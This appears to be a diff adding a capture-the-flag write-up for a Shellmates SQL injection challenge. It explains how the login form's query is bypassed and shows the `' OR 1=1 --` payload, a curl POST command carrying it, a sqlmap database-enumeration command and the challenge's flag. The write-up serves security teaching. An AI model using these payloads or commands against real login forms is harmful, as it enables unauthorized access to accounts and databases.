@@ -1,3 +1,32 @@
+# SQLi 1
+
+## Write-Up
+
+This challenge is pretty straight forward, it is about performing an **SQL INJECTION (SQLi)**. We can ddeduce that from the title, but also from labels of the form in the web page.
+
+the labels contains the actually query that wraps up our inputs before executing it. So the basic manipulation is to inject query condition in the `username` input like following :
+
+```
+username =' OR 1=1 --
+password =x
+```
+
+we can also make it cleaner by performing a `curl` command on it :
+
+```
+curl 'http://sqli-1.web-server.challs.ctf.shellmates.club/' -X POST --data "username=' OR 1=1 --" --data "password=x"
+```
+
+those will give us the flag right away
+
+## Flag
+
+shellmates{SQLi_goeS_BrrRrRR} 
+
+## More Information
+
+We can try to execute it using sqlmap, but in this challenge, number of attempts is limited so it won't work. But here is the command anyway :
+
 ```
 sqlmap -u "http://sqli-1.web-server.challs.ctf.shellmates.club/" --data="username=admin&password=admin" --method POST --dbs 
 ```
